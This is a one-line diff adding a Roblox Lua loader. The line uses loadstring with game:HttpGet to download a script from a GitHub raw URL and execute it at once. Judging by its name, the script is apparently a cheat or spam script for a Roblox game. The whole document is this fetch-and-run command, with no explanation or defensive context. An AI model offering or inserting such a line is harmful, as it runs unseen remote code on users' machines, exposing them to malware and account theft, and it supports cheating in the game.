@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/run-a-sari-sari-store-spam5-6g2wd753hzd12o.lua"))()
